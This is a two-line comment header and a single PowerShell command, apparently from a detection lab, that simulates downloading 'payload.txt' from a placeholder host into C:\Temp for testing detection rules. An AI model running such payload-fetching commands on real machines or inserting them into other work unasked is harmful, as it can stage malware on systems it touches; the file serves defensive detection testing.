# DevSecOps Detection Lab
# Controlled simulation: PowerShell remote content retrieval

powershell.exe -Command "Invoke-WebRequest -Uri https://example.invalid/payload.txt -OutFile C:\Temp\payload.txt"
